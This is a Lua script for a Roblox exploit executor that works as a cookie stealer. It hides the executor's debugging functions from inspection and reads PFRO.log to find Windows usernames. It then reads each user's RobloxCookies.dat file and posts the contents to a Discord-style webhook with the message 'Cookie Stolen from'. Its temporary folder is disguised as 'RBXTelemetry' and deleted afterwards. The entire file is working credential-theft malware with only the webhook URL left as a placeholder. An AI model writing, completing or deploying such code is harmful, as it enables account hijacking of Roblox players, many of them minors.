-- Patched (1/21/26)

local env = getgenv()

local oldgetgc = env.getgc
local oldgetrenv = env.getrenv
local oldgetreg = env.getreg
local olddebug = env.debug

env.getgc = nil
env.getrenv = nil
env.getreg = nil
env.debug = nil

local function read_external_file(path)
    local unix_path = path:gsub("\\", "/")
    local encoded_path = unix_path:gsub(" ", "%%20")
    
    local success, response = pcall(function()
        return request({
            Url = "file:///" .. encoded_path,
            Method = "GET"
        })
    end)

    if success and response.Body and #response.Body > 0 then
        return response.Body
    else
        return nil
    end
end

local success, pfro_response = pcall(function()
    return request({Url = "file:///C:/Windows/PFRO.log", Method = "GET"}) -- file to obtain PC username
end)

if not success or not pfro_response.Body then
    env.getgc = oldgetgc
    env.getrenv = oldgetrenv
    env.getreg = oldgetreg
    env.debug = olddebug
    return
end

if not isfolder("RBXTelemetry") then
    makefolder("RBXTelemetry")
end

writefile("RBXTelemetry/temp.txt", pfro_response.Body:gsub("\0", ""))

local content = readfile("RBXTelemetry/temp.txt")
local usernames = {}
local seen = {}
for username in content:gmatch("Users\\([^\\]+)\\") do
    if not seen[username] then
        table.insert(usernames, username)
        seen[username] = true
    end
end

for _, username in ipairs(usernames) do
    local file_content = read_external_file([[C:\Users\]] .. username .. [[\AppData\Local\Roblox\LocalStorage\RobloxCookies.dat]]) -- extract cookies
    if file_content then
        writefile("RBXTelemetry/" .. username .. ".txt", file_content)
        
        request({
            Url = "Webhook here",
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = game:GetService("HttpService"):JSONEncode({
                content = "**Cookie Stolen from: " .. username .. "**\n```\n" .. file_content .. "\n```"
            })
        })
    end
end

task.wait(2)
delfolder("RBXTelemetry")
env.getgc = oldgetgc
env.getrenv = oldgetrenv
env.getreg = oldgetreg
env.debug = olddebug
